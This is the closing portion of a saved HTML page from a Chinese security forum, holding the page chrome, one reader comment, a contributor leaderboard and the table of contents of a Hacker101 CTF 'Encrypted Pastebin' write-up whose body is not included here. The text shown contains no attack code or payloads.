+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">1</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="7054">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">2</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/7051" title="深入研究Pass-the-Hash攻击与防御"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>深入研究Pass-the-Hash...</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/7053" title="phpweb前台任意文件上传"><span class="related-label" style="">下一篇：</span>phpweb前台任意文件上传</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">1 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            
+                <ul class="post-info" id="reply-13614">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/291_51d3bb6aeecb0f3c04.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/291">evil7</a>
+                                
+                                <span class="bbs-time">2020-01-09 15:11:00</span>
+
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>哈哈哈，我做到最后一个就没做了，主要padding题里做sqli太麻烦了。。看着我就发懒</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="13614" data-topic="7054"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="evil7">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7054&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong><font style="vertical-align: inherit;">Prophet Community </font></strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7054&amp;from_type=xianzhi" class="btn"><font style="vertical-align: inherit;">Login now </font></a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;"><font style="vertical-align: inherit;">community blackboard </font></a>
+            </div>
+        </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year"><font style="vertical-align: inherit;">
+                Annual Contribution List </font></div>
+            <div class="text-center charts active" data-type="month"><font style="vertical-align: inherit;">
+                Monthly Contribution List </font></div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/19809_81cdc44b3d98558e6a.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/19809" title="Stars">Stars</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">5</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/21686" title="Ainrm">Ainrm</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/36574_e3fbd332c6c45e2014.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/36574" title="lyy">lyy</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/4830" title="藏青">藏青</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/29994" title="crow">crow</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                    <div class="member">
+                        <p class="text-center"><font style="vertical-align: inherit;">No ranking yet </font></p>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    <div class="box" id="toc-container" style="width: 270px;">
+        <div class="panel-info">
+            <div class="panel-heading">
+                <h4><font style="vertical-align: inherit;">content </font></h4>
+            </div>
+            <div id="toc">
+                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 50px;"></div>
+            <ol style="top: 50px;"><li><a href="#toc-0"><font style="vertical-align: inherit;">Background introduction </font></a></li><li><a href="#toc-1"><font style="vertical-align: inherit;">Topic description </font></a></li><li><a href="#toc-2"><font style="vertical-align: inherit;">Flag 1 </font></a></li><li><a href="#toc-3"><font style="vertical-align: inherit;">Flag 2 </font></a><ol><li><a href="#toc-4"><font style="vertical-align: inherit;">Error 1 </font></a></li><li><a href="#toc-5"><font style="vertical-align: inherit;">Error 2 </font></a></li><li><a href="#toc-6"><font style="vertical-align: inherit;">Error 3 </font></a></li></ol></li><li><a href="#toc-7"><font style="vertical-align: inherit;">Flag 3 </font></a></li><li><a href="#toc-8"><font style="vertical-align: inherit;">Flag 4 </font></a></li><li><a href="#toc-9"><font style="vertical-align: inherit;">Summarize </font></a></li><li><a href="#toc-10"><font style="vertical-align: inherit;">appendix </font></a></li></ol></div>
+        </div>
+    </div>
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart)
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer">
+    <div class="container text-center">
+        <div class="links">
+            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
+            <a href="https://xz.aliyun.com/protocol" target="_blank"><span>免责声明</span></a>
+            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
+            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
+        </div>
+    </div>
+</footer>
+
+<script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/bootstrap.js"></script>
+<script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/xz.js"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7054&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7054&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+        });
+    </script>
+
+
+
+<div id="waf_nc_block" style="display: none;"><div class="waf-nc-mask"></div><div id="WAF_NC_WRAPPER" class="waf-nc-wrapper"><img class="waf-nc-icon" src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/robot.png" alt="" width="150" height="111"><p class="waf-nc-description">为保证您的正常访问，请进行如下验证：</p><div id="nocaptcha"></div></div></div></body></html>
